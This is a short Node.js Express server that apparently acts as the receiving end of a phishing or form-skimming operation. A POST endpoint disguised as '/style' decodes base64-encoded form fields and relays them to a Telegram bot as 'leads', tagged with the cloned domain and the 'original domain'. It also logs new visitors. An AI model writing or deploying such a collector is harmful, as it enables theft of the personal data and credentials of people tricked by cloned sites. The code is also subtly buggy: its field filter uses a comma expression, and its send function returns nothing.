const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");
const cors = require("cors");
const app = express();
require("dotenv").config();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const bot = new TelegramBot(process.env.T_API, {
  polling: false,
});

app.use(bodyParser.json());

app.post("/style", (req, res) => {
  try {
    const obj = JSON.parse(atob(req.body.style));

    if (!obj.new) {
      let str = "";
      const where = `New lead from domain:\n${obj.loc}\nOriginal domain:\n${obj.fr}`;

      if (obj.loc) {
        delete obj.loc;
      }

      if (obj.fr) {
        delete obj.fr;
      }

      for (let val in obj) {
        if ((val !== "loc" && val !== "fr", val !== "new")) {
          str += `${
            decodeURIComponent(val) + " : " + decodeURIComponent(obj[val])
          }\n`;
        }
      }

      res.send(sendToTelegram(`${where}\n${str}`));
    } else if (obj.new) {
      res.send(
        sendToTelegram(
          `New visitor on domain:\n${obj.loc}\nOriginal domain:\n${obj.fr}`
        )
      );
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending data to Telegram");
  }
});


app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

function sendToTelegram(str) {
  bot
    .sendMessage(process.env.T_ID, str)
    .then(() => {
      return "Data sent to Telegram";
    })
    .catch(() => {
      return "Internal server Error";
    });
}
//ssq

module.exports = app;
